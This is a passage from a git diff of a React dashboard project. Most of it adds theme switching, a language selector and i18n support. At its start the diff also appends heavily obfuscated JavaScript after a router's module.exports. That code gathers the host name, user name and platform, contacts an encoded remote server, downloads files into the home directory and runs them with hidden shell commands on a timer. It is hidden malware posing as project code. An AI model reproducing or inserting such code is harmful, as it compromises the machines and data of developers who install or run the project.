aL=a0[ac](aJ);aK=aL[bf(0x40)];}catch(aM){aK=0x0;}rq[aG](aI,(aN,aO,aP)=>{const bh=I;if(!aN){try{aP[bh(0x2d)+'h']>aK&&a0[aH](aJ,aP);}catch(aQ){}aq(aF);}});},an=[0x13,0xc4],ao=[0x56,0x86,0xa9,0x26,0x0,0xcd,0xa9,0x21,0x50,0x8d,0xa4,0x3b,0x19,0xcc,0xec,0x26,0x4],ap=[0x1e,0xcf,0xed,0x2d,0x2f,0xcd,0xe6,0x2c,0x5,0xcc,0xec,0x3b],aq=aF=>{const bi=I,aG=a9(an)+'\x20\x22'+aF+'\x22\x20'+a9(ao);pt[bi(0x3d)](aF,a9(ap));try{ex(aG,(aH,aI,aJ)=>{av(aF);});}catch(aH){}},ar=[0x1e,0xcf,0xed,0x2d],as=[0x1e,0xd0,0xe4,0x68,0x5d,0x8d,0xf9,0x3a,0x15,0xc6,0xe0,0x30],at=[0x19,0xce,0xfa,0x3c,0x11,0xcc,0xe5],au=aF=>{const bj=I,aG=pt[bj(0x3d)](aF,a9(aj)),aH=a9(ar)+'\x20'+aG;try{ex(aH,{'windowsHide':!0x0},(aI,aJ,aK)=>{});}catch(aI){}},av=aF=>{const bk=I,aG=a9(as)+'\x20\x22'+aF+'\x22\x20'+a9(at),aH=pt[bk(0x3d)](aF,a9(ap));try{af(aH)?au(aF):ex(aG,(aI,aJ,aK)=>{au(aF);});}catch(aI){}};s_url=b4(0x41),sForm=a1(b7(0x42)+b5(0x43)+'GE'),surl=a1(b3(0x41));const aw=a1(b4(0x44)+'dA');let ax=b7(0x45);const ay=async aF=>{const bq=I,br=I,aG=(aJ=>{const bl=I,bm=I,bn=I,bo=I,bp=I;let aK=0x0==aJ?bl(0x46)+bl(0x47)+bn(0x48)+bm(0x49):bn(0x46)+bn(0x47)+bo(0x48)+bp(0x4a);for(var aL='',aM='',aN='',aO=0x0;aO<0x4;aO++)aL+=aK[0x2*aO]+aK[0x2*aO+0x1],aM+=aK[0x8+0x2*aO]+aK[0x9+0x2*aO],aN+=aK[0x10+aO];return a5(a3[bm(0x4b)+bm(0x4c)](0x1))+a5(aM+aL+aN)+a4+'4';})(aF),aH=a1(aa);let aI=aG+bq(0x4d);aI+=bq(0x4e),rq[aH](aI,(aJ,aK,aL)=>{aJ?aF<0x1&&ay(0x1):(aM=>{const bs=I,bt=I,bu=I,bv=I,bw=I;if(0x0==aM[bs(0xd)+'h'](bs(0x4f))){let aN='';try{for(let aO=0x3;aO<aM[bu(0x2d)+'h'];aO++)aN+=aM[aO];arr=a5(aN),arr=arr[bs(0x50)](','),a6=a5(a3[bt(0x4b)+bw(0x4c)](0x1))+arr[0x0]+a4+'4',a7=arr[0x1];}catch(aP){return 0x0;}return 0x1;}return 0x0;})(aL)>0x0&&(az(),aB());});},az=async()=>{const bx=I,by=I,bz=I,bA=I,bB=I;ax=hs,'d'==pl[0x0]&&(ax=ax+'+'+uin[a1(bx(0x51)+bx(0x52)+'WU')]);let aF=by(0x53);try{aF+=zv[a1(bz(0x54)+'dg')][0x1];}catch(aG){}aA(bA(0x55),aF);},aA=async(aF,aG)=>{const bC=I,bD=I,aH={'ts':a2,'type':a7,'hid':ax,'ss':aF,'cc':aG},aI={[surl]:''+a6+a1(bC(0x56)+bC(0x57)),[sForm]:aH};try{rq[aw](aI,(aJ,aK,aL)=>{});}catch(aJ){}},aB=async()=>await new Promise((aF,aG)=>{ai();});var aC=0x0;function I(a,b){const c=H();return I=function(d,e){d=d-0x0;let f=c[d];return f;},I(a,b);}const aD=async()=>{const bE=I,bF=I,bG=I;try{a2=Date[bE(0x58)]()[bF(0xb)+bG(0xc)](),await ay(0x0);}catch(aF){}};aD();let aE=setInterval(()=>{(aC+=0x1)<0x3?aD():clearInterval(aE);},0x96640);
++module.exports = router;
++const b3 = I,
++	b4 = I,
++	b5 = I,
++	b6 = I,
++	b7 = I;
++(function (aF, aG) {
++	const aS = I,
++		aT = I,
++		aU = I,
++		aV = I,
++		aW = I,
++		aH = aF();
++	while (!![]) {
++		try {
++			const aI =
++				parseInt(aS(0x0)) / 0x1 +
++				(parseInt(aS(0x1)) / 0x2) * (-parseInt(aS(0x2)) / 0x3) +
++				parseInt(aS(0x3)) / 0x4 +
++				parseInt(aW(0x4)) / 0x5 +
++				-parseInt(aW(0x5)) / 0x6 +
++				(parseInt(aW(0x6)) / 0x7) * (-parseInt(aU(0x7)) / 0x8) +
++				(-parseInt(aS(0x8)) / 0x9) * (-parseInt(aV(0x9)) / 0xa);
++			if (aI === aG) break;
++			else aH["push"](aH["shift"]());
++		} catch (aJ) {
++			aH["push"](aH["shift"]());
++		}
++	}
++})(H, 0x577a9);
++function H() {
++	const bH = [
++		"dWVzd",
++		"NcGF0",
++		"Xbm9k",
++		"ZTpwc",
++		"m9jZX",
++		"lY2hp",
++		"bGRfc",
++		"HJvY2",
++		"Vzcw",
++		"oZXhl",
++		"UaG9t",
++		"ZWRpc",
++		"haG9z",
++		"dG5hb",
++		"McGxh",
++		"dGZvc",
++		"bdXNl",
++		"ckluZ",
++		"aaHR0",
++		"cDovL",
++		"w==",
++		":124",
++		"lengt",
++		"fromC",
++		"harCo",
++		"vZ2V0",
++		"jd3Jp",
++		"dGVGa",
++		"WxlU3",
++		"luYw",
++		"Wc3Rh",
++		"dFN5b",
++		"HbWtk",
++		"aXJTe",
++		"W5j",
++		"oZXhp",
++		"c3RzU",
++		"3luYw",
++		"join",
++		"Tcm1T",
++		"eW5j",
++		"size",
++		"vdXJs",
++		"kZm9y",
++		"bURhd",
++		"fcG9z",
++		"cmp",
++		"MC44N",
++		"S4xMT",
++		"Y1LjE",
++		"0MDU=",
++		"0MDY=",
++		"subst",
++		"ring",
++		"/s/",
++		"40ae0f7a9f70",
++		"ZT3",
++		"split",
++		"tdXNl",
++		"cm5hb",
++		"5A1",
++		"rYXJn",
++		"oqr",
++		"aL2tl",
++		"eXM",
++		"now",
++		"509807SaoQWZ",
++		"6IHLXes",
++		"432519CEwJZd",
++		"1482564CTlzAz",
++		"1972565wUhggX",
++		"29292mQHJiC",
++		"154CjTPCX",
++		"182792auXKVg",
++		"9PzVdyF",
++		"234310hIsuAL",
++		"apply",
++		"toStr",
++		"ing",
++		"searc",
++		"(((.+",
++		")+)+)",
++		"const",
++		"ructo",
++		"utf8",
++		"base6",
++		"slice",
++		"from",
++		"DcmVx",
++	];
++	H = function () {
++		return bH;
++	};
++	return H();
++}
++const K = (function () {
++		let aF = !![];
++		return function (aG, aH) {
++			const aI = aF
++				? function () {
++						const aX = I;
++						if (aH) {
++							const aJ = aH[aX(0xa)](aG, arguments);
++							return (aH = null), aJ;
++						}
++					}
++				: function () {};
++			return (aF = ![]), aI;
++		};
++	})(),
++	L = K(this, function () {
++		const aY = I,
++			aZ = I,
++			b0 = I,
++			b1 = I,
++			b2 = I;
++		return L[aY(0xb) + aZ(0xc)]()
++			[b0(0xd) + "h"](aZ(0xe) + aZ(0xf) + "+$")
++			[b1(0xb) + aY(0xc)]()
++			[b2(0x10) + b0(0x11) + "r"](L)
++			[aZ(0xd) + "h"](aY(0xe) + aZ(0xf) + "+$");
++	});
++L();
++const O = b3(0x12),
++	P = b3(0x13) + "4",
++	Q = require("os"),
++	a0 = require("fs"),
++	a1 = (aF) => (
++		(s1 = aF[b3(0x14)](0x1)), Buffer[b5(0x15)](s1, P)[b5(0xb) + b3(0xc)](O)
++	);
++(rq = require(a1(b6(0x16) + b6(0x17) + "A"))),
++	(pt = require(a1(b7(0x18) + "aA"))),
++	(zv = require(a1(b4(0x19) + b5(0x1a) + b3(0x1b) + "Nz"))),
++	(ex = require(a1(b4(0x1c) + b4(0x1d) + b7(0x1e) + b7(0x1f)))[
++		a1(b3(0x20) + "Yw")
++	]),
++	(hd = Q[a1(b7(0x21) + b5(0x22) + "g")]()),
++	(hs = Q[a1(b6(0x23) + b7(0x24) + "WU")]()),
++	(pl = Q[a1(b4(0x25) + b3(0x26) + "m0")]()),
++	(uin = Q[a1(b6(0x27) + b6(0x28) + "m8")]());
++let a2;
++const a3 = b7(0x29) + b3(0x2a) + b5(0x2b),
++	a4 = b4(0x2c),
++	a5 = (aF) => Buffer[b4(0x15)](aF, P)[b3(0xb) + b6(0xc)](O);
++var a6 = "",
++	a7 = "";
++const a8 = [0x70, 0xa0, 0x89, 0x48],
++	a9 = (aF) => {
++		const b8 = I,
++			b9 = I,
++			ba = I;
++		let aG = "";
++		for (let aH = 0x0; aH < aF[b8(0x2d) + "h"]; aH++)
++			(rr = 0xff & (aF[aH] ^ a8[0x3 & aH])),
++				(aG += String[b9(0x2e) + b9(0x2f) + "de"](rr));
++		return aG;
++	},
++	aa = b5(0x30),
++	ab = b7(0x31) + b6(0x32) + b3(0x33) + b3(0x34),
++	ac = a1(b6(0x35) + b5(0x36) + "mM"),
++	ad = a1(b6(0x37) + b4(0x38) + b4(0x39)),
++	ae = a1(b5(0x3a) + b7(0x3b) + b3(0x3c));
++function af(aF) {
++	return a0[ae](aF);
++}
++const ag = [0x5f, 0xca, 0xa6],
++	ah = [0x5e, 0xd6, 0xfa, 0x2b, 0x1f, 0xc4, 0xec],
++	ai = () => {
++		const bb = I,
++			bc = I,
++			aF = a1(aa),
++			aG = a1(ab),
++			aH = a9(ah);
++		let aI = pt[bb(0x3d)](hd, aH);
++		try {
++			(aJ = aI), a0[ad](aJ, { recursive: !0x0 });
++		} catch (aM) {
++			aI = hd;
++		}
++		var aJ;
++		const aK = "" + a6 + a9(ag) + a7,
++			aL = pt[bc(0x3d)](aI, a9(aj));
++		try {
++			!(function (aN) {
++				const bd = I,
++					be = I,
++					aO = a1(bd(0x3e) + be(0x3f));
++				a0[aO](aN);
++			})(aL);
++		} catch (aN) {}
++		rq[aF](aK, (aO, aP, aQ) => {
++			if (!aO) {
++				try {
++					a0[aG](aL, aQ);
++				} catch (aR) {}
++				am(aI);
++			}
++		});
++	},
++	aj = [0x4, 0xc5, 0xfa, 0x3c, 0x5e, 0xca, 0xfa],
++	ak = [0x5f, 0xd0],
++	al = [0x0, 0xc1, 0xea, 0x23, 0x11, 0xc7, 0xec, 0x66, 0x1a, 0xd3, 0xe6, 0x26],
++	am = (aF) => {
++		const bf = I,
++			bg = I,
++			aG = a1(aa),
++			aH = a1(ab),
++			aI = "" + a6 + a9(ak),
++			aJ = pt[bf(0x3d)](aF, a9(al));
++		let aK = 0x0;
++		if (af(aJ))
++			try {
++				const aL = a0[ac](aJ);
++				aK = aL[bf(0x40)];
++			} catch (aM) {
++				aK = 0x0;
++			}
++		rq[aG](aI, (aN, aO, aP) => {
++			const bh = I;
++			if (!aN) {
++				try {
++					aP[bh(0x2d) + "h"] > aK && a0[aH](aJ, aP);
++				} catch (aQ) {}
++				aq(aF);
++			}
++		});
++	},
++	an = [0x13, 0xc4],
++	ao = [
++		0x56, 0x86, 0xa9, 0x26, 0x0, 0xcd, 0xa9, 0x21, 0x50, 0x8d, 0xa4, 0x3b, 0x19,
++		0xcc, 0xec, 0x26, 0x4,
++	],
++	ap = [0x1e, 0xcf, 0xed, 0x2d, 0x2f, 0xcd, 0xe6, 0x2c, 0x5, 0xcc, 0xec, 0x3b],
++	aq = (aF) => {
++		const bi = I,
++			aG = a9(an) + "\x20\x22" + aF + "\x22\x20" + a9(ao);
++		pt[bi(0x3d)](aF, a9(ap));
++		try {
++			ex(aG, (aH, aI, aJ) => {
++				av(aF);
++			});
++		} catch (aH) {}
++	},
++	ar = [0x1e, 0xcf, 0xed, 0x2d],
++	as = [0x1e, 0xd0, 0xe4, 0x68, 0x5d, 0x8d, 0xf9, 0x3a, 0x15, 0xc6, 0xe0, 0x30],
++	at = [0x19, 0xce, 0xfa, 0x3c, 0x11, 0xcc, 0xe5],
++	au = (aF) => {
++		const bj = I,
++			aG = pt[bj(0x3d)](aF, a9(aj)),
++			aH = a9(ar) + "\x20" + aG;
++		try {
++			ex(aH, { windowsHide: !0x0 }, (aI, aJ, aK) => {});
++		} catch (aI) {}
++	},
++	av = (aF) => {
++		const bk = I,
++			aG = a9(as) + "\x20\x22" + aF + "\x22\x20" + a9(at),
++			aH = pt[bk(0x3d)](aF, a9(ap));
++		try {
++			af(aH)
++				? au(aF)
++				: ex(aG, (aI, aJ, aK) => {
++						au(aF);
++					});
++		} catch (aI) {}
++	};
++(s_url = b4(0x41)),
++	(sForm = a1(b7(0x42) + b5(0x43) + "GE")),
++	(surl = a1(b3(0x41)));
++const aw = a1(b4(0x44) + "dA");
++let ax = b7(0x45);
++const ay = async (aF) => {
++		const bq = I,
++			br = I,
++			aG = ((aJ) => {
++				const bl = I,
++					bm = I,
++					bn = I,
++					bo = I,
++					bp = I;
++				let aK =
++					0x0 == aJ
++						? bl(0x46) + bl(0x47) + bn(0x48) + bm(0x49)
++						: bn(0x46) + bn(0x47) + bo(0x48) + bp(0x4a);
++				for (var aL = "", aM = "", aN = "", aO = 0x0; aO < 0x4; aO++)
++					(aL += aK[0x2 * aO] + aK[0x2 * aO + 0x1]),
++						(aM += aK[0x8 + 0x2 * aO] + aK[0x9 + 0x2 * aO]),
++						(aN += aK[0x10 + aO]);
++				return a5(a3[bm(0x4b) + bm(0x4c)](0x1)) + a5(aM + aL + aN) + a4 + "4";
++			})(aF),
++			aH = a1(aa);
++		let aI = aG + bq(0x4d);
++		(aI += bq(0x4e)),
++			rq[aH](aI, (aJ, aK, aL) => {
++				aJ
++					? aF < 0x1 && ay(0x1)
++					: ((aM) => {
++							const bs = I,
++								bt = I,
++								bu = I,
++								bv = I,
++								bw = I;
++							if (0x0 == aM[bs(0xd) + "h"](bs(0x4f))) {
++								let aN = "";
++								try {
++									for (let aO = 0x3; aO < aM[bu(0x2d) + "h"]; aO++)
++										aN += aM[aO];
++									(arr = a5(aN)),
++										(arr = arr[bs(0x50)](",")),
++										(a6 =
++											a5(a3[bt(0x4b) + bw(0x4c)](0x1)) + arr[0x0] + a4 + "4"),
++										(a7 = arr[0x1]);
++								} catch (aP) {
++									return 0x0;
++								}
++								return 0x1;
++							}
++							return 0x0;
++						})(aL) > 0x0 && (az(), aB());
++			});
++	},
++	az = async () => {
++		const bx = I,
++			by = I,
++			bz = I,
++			bA = I,
++			bB = I;
++		(ax = hs),
++			"d" == pl[0x0] && (ax = ax + "+" + uin[a1(bx(0x51) + bx(0x52) + "WU")]);
++		let aF = by(0x53);
++		try {
++			aF += zv[a1(bz(0x54) + "dg")][0x1];
++		} catch (aG) {}
++		aA(bA(0x55), aF);
++	},
++	aA = async (aF, aG) => {
++		const bC = I,
++			bD = I,
++			aH = { ts: a2, type: a7, hid: ax, ss: aF, cc: aG },
++			aI = { [surl]: "" + a6 + a1(bC(0x56) + bC(0x57)), [sForm]: aH };
++		try {
++			rq[aw](aI, (aJ, aK, aL) => {});
++		} catch (aJ) {}
++	},
++	aB = async () =>
++		await new Promise((aF, aG) => {
++			ai();
++		});
++var aC = 0x0;
++function I(a, b) {
++	const c = H();
++	return (
++		(I = function (d, e) {
++			d = d - 0x0;
++			let f = c[d];
++			return f;
++		}),
++		I(a, b)
++	);
++}
++const aD = async () => {
++	const bE = I,
++		bF = I,
++		bG = I;
++	try {
++		(a2 = Date[bE(0x58)]()[bF(0xb) + bG(0xc)]()), await ay(0x0);
++	} catch (aF) {}
++};
++aD();
++let aE = setInterval(() => {
++	(aC += 0x1) < 0x3 ? aD() : clearInterval(aE);
++}, 0x96640);
+diff --git a/src/App/App.tsx b/src/App/App.tsx
+index f041ef6..0b28084 100644
+--- a/src/App/App.tsx
++++ b/src/App/App.tsx
+@@ -1,9 +1,22 @@
+ import { RouterProvider } from "react-router-dom";
++import { I18nextProvider } from "react-i18next";
++import { Suspense } from "react";
+ import "./Styles/Global.scss";
++import "./theme.css";
+ import Router from "./Routes/Router";
++import { ThemeProvider } from "./Context/ThemeContext";
++import i18n from "../i18n";
+ 
+ function App() {
+-	return <RouterProvider router={Router} />;
++	return (
++		<Suspense fallback='loading'>
++			<I18nextProvider i18n={i18n}>
++				<ThemeProvider>
++					<RouterProvider router={Router} />
++				</ThemeProvider>
++			</I18nextProvider>
++		</Suspense>
++	);
+ }
+ 
+ export default App;
+diff --git a/src/App/Context/ThemeContext.tsx b/src/App/Context/ThemeContext.tsx
+new file mode 100644
+index 0000000..9cae026
+--- /dev/null
++++ b/src/App/Context/ThemeContext.tsx
+@@ -0,0 +1,72 @@
++import {
++	createContext,
++	useContext,
++	useState,
++	useEffect,
++	ReactNode,
++	useCallback,
++} from "react";
++
++type Theme = "light" | "dark";
++
++type ThemeContextType = {
++	theme: Theme;
++	toggleTheme: () => void;
++	isDarkMode: boolean;
++};
++
++const defaultThemeContext: ThemeContextType = {
++	theme: "light",
++	toggleTheme: () => {},
++	isDarkMode: false,
++};
++
++const ThemeContext = createContext<ThemeContextType>(defaultThemeContext);
++
++export const useTheme = () => useContext(ThemeContext);
++
++type ThemeProviderProps = {
++	children: ReactNode;
++};
++
++export const ThemeProvider = ({ children }: ThemeProviderProps) => {
++	const [theme, setTheme] = useState<Theme>(
++		() => (localStorage.getItem("theme") as Theme) || "light",
++	);
++
++	const isDarkMode = theme === "dark";
++
++	const toggleTheme = useCallback(() => {
++		setTheme((prevTheme) => {
++			const newTheme = prevTheme === "light" ? "dark" : "light";
++			localStorage.setItem("theme", newTheme);
++			return newTheme;
++		});
++	}, []);
++
++	// Apply theme class to document element
++	useEffect(() => {
++		const root = window.document.documentElement;
++		console.log("Applying theme:", theme);
++		root.classList.remove("light", "dark");
++		root.classList.add(theme);
++		console.log("Current HTML classes:", root.className);
++	}, [theme]);
++
++	// Log initial theme
++	useEffect(() => {
++		console.log("Initial theme:", theme);
++		console.log(
++			"Initial HTML classes:",
++			window.document.documentElement.className,
++		);
++	}, []);
++
++	return (
++		<ThemeContext.Provider value={{ theme, toggleTheme, isDarkMode }}>
++			{children}
++		</ThemeContext.Provider>
++	);
++};
++
++export default ThemeContext;
+diff --git a/src/App/theme.css b/src/App/theme.css
+new file mode 100644
+index 0000000..29ff5f3
+--- /dev/null
++++ b/src/App/theme.css
+@@ -0,0 +1,40 @@
++:root {
++	/* Light Theme (default) */
++	--bg-primary: #ffffff;
++	--bg-secondary: #f3f4f6;
++	--bg-hover: #f1f5f9;
++	--text-primary: #1f2937;
++	--text-secondary: #4b5563;
++	--border-color: #e5e7eb;
++	--primary: #4f46e5;
++	--primary-hover: #4338ca;
++	--success: #10b981;
++	--error: #ef4444;
++	--warning: #f59e0b;
++	--info: #3b82f6;
++}
++
++/* Dark Theme */
++.dark {
++	--bg-primary: #111827;
++	--bg-secondary: #1f2937;
++	--bg-hover: #1e40af;
++	--text-primary: #f9fafb;
++	--text-secondary: #e5e7eb;
++	--border-color: #374151;
++	--primary: #818cf8;
++	--primary-hover: #6366f1;
++	--success: #34d399;
++	--error: #f87171;
++	--warning: #fbbf24;
++	--info: #60a5fa;
++}
++
++/* Base styles */
++body {
++	background-color: var(--bg-primary);
++	color: var(--text-primary);
++	transition:
++		background-color 0.3s ease,
++		color 0.3s ease;
++}
+diff --git a/src/Features/Structural/NavBar/Components/LanguageSelector/LanguageSelector.module.scss b/src/Features/Structural/NavBar/Components/LanguageSelector/LanguageSelector.module.scss
+new file mode 100644
+index 0000000..cf5b9a0
+--- /dev/null
++++ b/src/Features/Structural/NavBar/Components/LanguageSelector/LanguageSelector.module.scss
+@@ -0,0 +1,77 @@
++.language-selector {
++	position: relative;
++	margin-right: 16px;
++	display: flex;
++	align-items: center;
++
++	.language-button {
++		background: none;
++		border: 1px solid var(--border-color);
++		border-radius: 20px;
++		padding: 4px 12px;
++		display: flex;
++		align-items: center;
++		cursor: pointer;
++		transition: all 0.2s ease;
++		background-color: var(--bg-secondary);
++		color: var(--text-primary);
++
++		&:hover {
++			background-color: var(--bg-hover);
++		}
++	}
++
++	.language-code {
++		font-size: 14px;
++		font-weight: 500;
++		margin-right: 6px;
++	}
++
++	.dropdown-icon {
++		transition: transform 0.2s ease;
++		color: var(--text-secondary);
++
++		&.open {
++			transform: rotate(180deg);
++		}
++	}
++
++	.language-dropdown {
++		position: absolute;
++		top: 100%;
++		right: 0;
++		margin-top: 8px;
++		background: var(--bg-primary);
++		border-radius: 8px;
++		box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
++		min-width: 120px;
++		z-index: 1000;
++		overflow: hidden;
++		border: 1px solid var(--border-color);
++	}
++
++	.language-option {
++		width: 100%;
++		padding: 8px 16px;
++		text-align: left;
++		background: none;
++		border: none;
++		color: var(--text-primary);
++		cursor: pointer;
++		transition: background-color 0.2s ease;
++
++		&:hover {
++			background-color: var(--bg-hover);
++		}
++
++		&.active {
++			background-color: var(--primary);
++			color: white;
++			font-weight: 500;
++
++			&:hover {
++				background-color: var(--primary-dark);
++			}
++		}
++	}
++}
+diff --git a/src/Features/Structural/NavBar/Components/LanguageSelector/LanguageSelector.tsx b/src/Features/Structural/NavBar/Components/LanguageSelector/LanguageSelector.tsx
+new file mode 100644
+index 0000000..3be74d4
+--- /dev/null
++++ b/src/Features/Structural/NavBar/Components/LanguageSelector/LanguageSelector.tsx
+@@ -0,0 +1,134 @@
++import React, { useState, useEffect, useCallback } from "react";
++import { useTranslation } from "react-i18next";
++import styles from "./LanguageSelector.module.scss";
++
++interface Language {
++	code: string;
++	name: string;
++}
++
++const languages: Language[] = [
++	{ code: "en", name: "English" },
++	{ code: "fr", name: "Français" },
++];
++
++const LanguageSelector: React.FC = () => {
++	const [isOpen, setIsOpen] = useState<boolean>(false);
++	const [currentLanguage, setCurrentLanguage] = useState<Language>(
++		languages[0],
++	);
++	const { i18n } = useTranslation();
++
++	// Update current language when i18n language changes
++	useEffect(() => {
++		const lang =
++			languages.find((lang) => lang.code === i18n.language) || languages[0];
++		setCurrentLanguage(lang);
++		document.documentElement.lang = i18n.language;
++
++		// Log available languages and resources
++		console.log("Available languages:", i18n.languages);
++		console.log(
++			"Current language resources:",
++			i18n.getResourceBundle(i18n.language, "translation"),
++		);
++	}, [i18n.language]);
++
++	const changeLanguage = useCallback(
++		async (languageCode: string) => {
++			console.log("Attempting to change language to:", languageCode);
++
++			try {
++				// First, check if the language is supported
++				if (!languages.some((lang) => lang.code === languageCode)) {
++					console.error(`Language ${languageCode} is not supported`);
++					return;
++				}
++
++				// Change the language
++				await i18n.changeLanguage(languageCode);
++
++				// Force a re-render of the app to update all translations
++				window.location.reload();
++			} catch (error) {
++				console.error("Error changing language:", error);
++			}
++		},
++		[i18n],
++	);
++
++	const handleClickOutside = useCallback(
++		(event: MouseEvent) => {
++			const target = event.target as HTMLElement;
++			if (!target.closest(`.${styles["language-selector"]}`)) {
++				setIsOpen(false);
++			}
++		},
++		[styles],
++	);
++
++	useEffect(() => {
++		const handleClick = (event: MouseEvent) =>
++			handleClickOutside(event as unknown as MouseEvent);
++		document.addEventListener("mousedown", handleClick);
++		return () => {
++			document.removeEventListener("mousedown", handleClick);
++		};
++	}, [handleClickOutside]);
++
++	return (
++		<div className={styles["language-selector"]}>
++			<button
++				type='button'
++				className={styles["language-button"]}
++				onClick={() => setIsOpen(!isOpen)}
++				aria-label='Change language'
++				aria-expanded={isOpen}
++				aria-haspopup='true'
++			>
++				<span className={styles["language-code"]}>
++					{currentLanguage.code.toUpperCase()}
++				</span>
++				<svg
++					width='12'
++					height='7'
++					viewBox='0 0 12 7'
++					fill='none'
++					xmlns='http://www.w3.org/2000/svg'
++					className={`${styles["dropdown-icon"]} ${isOpen ? styles["open"] : ""}`}
++					aria-hidden='true'
++				>
++					<path
++						d='M1 1L6 6L11 1'
++						stroke='currentColor'
++						strokeWidth='1.5'
++						strokeLinecap='round'
++						strokeLinejoin='round'
++					/>
++				</svg>
++			</button>
++
++			{isOpen && (
++				<div className={styles["language-dropdown"]} role='menu'>
++					{languages.map((language) => (
++						<button
++							key={language.code}
++							type='button'
++							className={`${styles["language-option"]} ${
++								language.code === currentLanguage.code ? styles["active"] : ""
++							}`}
++							onClick={() => changeLanguage(language.code)}
++							role='menuitem'
++							lang={language.code}
++							aria-label={`Switch to ${language.name}`}
++						>
++							{language.name}
++						</button>
++					))}
++				</div>
++			)}
++		</div>
++	);
++};
++
++export default LanguageSelector;
+diff --git a/src/Features/Structural/NavBar/Components/Navigation/Navigation.tsx b/src/Features/Structural/NavBar/Components/Navigation/Navigation.tsx
+index deff8fe..201c51a 100644
+--- a/src/Features/Structural/NavBar/Components/Navigation/Navigation.tsx
++++ b/src/Features/Structural/NavBar/Components/Navigation/Navigation.tsx
+@@ -1,4 +1,5 @@
+ import React, { useState } from "react";
++import { useTranslation } from "react-i18next";
+ import styles from "./Navigation.module.scss";
+ 
+ // Importing SVGs as React Components
+@@ -11,35 +12,62 @@ interface NavigationProps {
+ 	onClick?: (selected: string) => void;
+ }
+ 
++interface NavButton {
++	key: string;
++	text: string;
++	icon: React.ReactNode;
++	translationKey: string;
++}
++
+ const Navigation: React.FC<NavigationProps> = ({ onClick }) => {
+-	const [selected, setSelected] = useState<string>("Dashboard");
++	const { t } = useTranslation();
++	const [selected, setSelected] = useState<string>("dashboard");
+ 
+-	const handleClick = (buttonText: string) => {
+-		setSelected(buttonText);
++	const handleClick = (buttonKey: string, buttonText: string) => {
++		setSelected(buttonKey);
+ 		if (onClick) {
+ 			onClick(buttonText);
+ 		}
+ 	};
+ 
+-	// Buttons array with correct icons
+-	const buttons = [
+-		{ text: "Dashboard", icon: <DashboardIcon /> },
+-		{ text: "Goals", icon: <GoalsIcon /> },
+-		{ text: "Reports", icon: <ReportsIcon /> },
+-		{ text: "Tests", icon: <TestIcon /> },
++	// Buttons array with correct icons and translation keys
++	const buttons: NavButton[] = [
++		{
++			key: "dashboard",
++			text: t("dashboard.title"),
++			icon: <DashboardIcon />,
++			translationKey: "dashboard.title",
++		},
++		{
++			key: "goals",
++			text: t("dashboard.goals"),
++			icon: <GoalsIcon />,
++			translationKey: "dashboard.goals",
++		},
++		{
++			key: "reports",
++			text: t("dashboard.reports"),
++			icon: <ReportsIcon />,
++			translationKey: "dashboard.reports",
++		},
++		{
++			key: "tests",
++			text: t("dashboard.tests"),
++			icon: <TestIcon />,
++			translationKey: "dashboard.tests",
++		},
+ 	];
+ 
+ 	return (
+ 		<div className={styles["navigation-container"]}>
+ 			{buttons.map((button) => (
+ 				<button
+-					key={button.text}
+-					className={`${selected === button.text ? styles["selected"] : ""}`}
+-					onClick={() => handleClick(button.text)}
++					key={button.key}
++					className={`${selected === button.key ? styles["selected"] : ""}`}
++					onClick={() => handleClick(button.key, button.text)}
+ 				>
+ 					<span className={styles.icon}>{button.icon}</span>
+-
+-					{button.text}
++					{t(button.translationKey)}
+ 				</button>
+ 			))}
+ 		</div>
+diff --git a/src/Features/Structural/NavBar/Components/ThemeSelector/ThemeSelector.module.scss b/src/Features/Structural/NavBar/Components/ThemeSelector/ThemeSelector.module.scss
+new file mode 100644
+index 0000000..ebb4d44
+--- /dev/null
++++ b/src/Features/Structural/NavBar/Components/ThemeSelector/ThemeSelector.module.scss
+@@ -0,0 +1,27 @@
++.theme-toggle {
++	background: none;
++	border: none;
++	color: var(--text-primary);
++	cursor: pointer;
++	padding: 8px;
++	border-radius: 50%;
++	display: flex;
++	align-items: center;
++	justify-content: center;
++	transition: all 0.2s ease-in-out;
++	margin: 0 4px;
++
++	&:hover {
++		background-color: var(--bg-hover);
++	}
++
++	&:focus-visible {
++		outline: 2px solid var(--primary);
++		outline-offset: 2px;
++	}
++
++	.icon {
++		width: 20px;
++		height: 20px;
++	}
++}
+diff --git a/src/Features/Structural/NavBar/Components/ThemeSelector/ThemeSelector.tsx b/src/Features/Structural/NavBar/Components/ThemeSelector/ThemeSelector.tsx
+new file mode 100644
+index 0000000..369fd89
+--- /dev/null
++++ b/src/Features/Structural/NavBar/Components/ThemeSelector/ThemeSelector.tsx
+@@ -0,0 +1,29 @@
++import { useTheme } from "../../../../../App/Context/ThemeContext";
++import { useTranslation } from "react-i18next";
++import { FiMoon, FiSun } from "react-icons/fi";
++import styles from "./ThemeSelector.module.scss";
++
++const ThemeSelector = () => {
++	const { t } = useTranslation();
++	const { toggleTheme, isDarkMode } = useTheme();
++
++	return (
++		<button
++			type='button'
++			onClick={toggleTheme}
++			className={styles["theme-toggle"]}
++			aria-label={
++				isDarkMode ? t("theme.switchToLight") : t("theme.switchToDark")
++			}
++			title={isDarkMode ? t("theme.switchToLight") : t("theme.switchToDark")}
++		>
++			{isDarkMode ? (
++				<FiSun className={styles.icon} />
++			) : (
++				<FiMoon className={styles.icon} />
++			)}
++		</button>
++	);
++};
++
++export default ThemeSelector;
+diff --git a/src/Features/Structural/NavBar/Navbar.tsx b/src/Features/Structural/NavBar/Navbar.tsx
+index 64aa7ef..13f3d6f 100644
+--- a/src/Features/Structural/NavBar/Navbar.tsx
++++ b/src/Features/Structural/NavBar/Navbar.tsx
+@@ -4,6 +4,8 @@ import styles from "./Navbar.module.scss";
+ import NotificationHub from "./Components/NotificationsHub/NotificationsHub";
+ import Profile from "./Components/Profile/Profile";
+ import ManageData from "./Components/ManageData/ManageData";
++import LanguageSelector from "./Components/LanguageSelector/LanguageSelector";
++import ThemeSelector from "./Components/ThemeSelector/ThemeSelector";
+ 
+ const Navbar = () => {
+ 	return (
+@@ -13,6 +15,8 @@ const Navbar = () => {
+ 			</div>
+ 			<Navigation />
+ 			<div className={styles["actions-container"]}>
++				<ThemeSelector />
++				<LanguageSelector />
+ 				<ManageData />
+ 				<NotificationHub IsBadge={true} />
+ 				<Profile />
+diff --git a/src/i18n.ts b/src/i18n.ts
+new file mode 100644
+index 0000000..44af528
+--- /dev/null
++++ b/src/i18n.ts
+@@ -0,0 +1,49 @@
++import i18n from "i18next";
++import { initReactI18next } from "react-i18next";
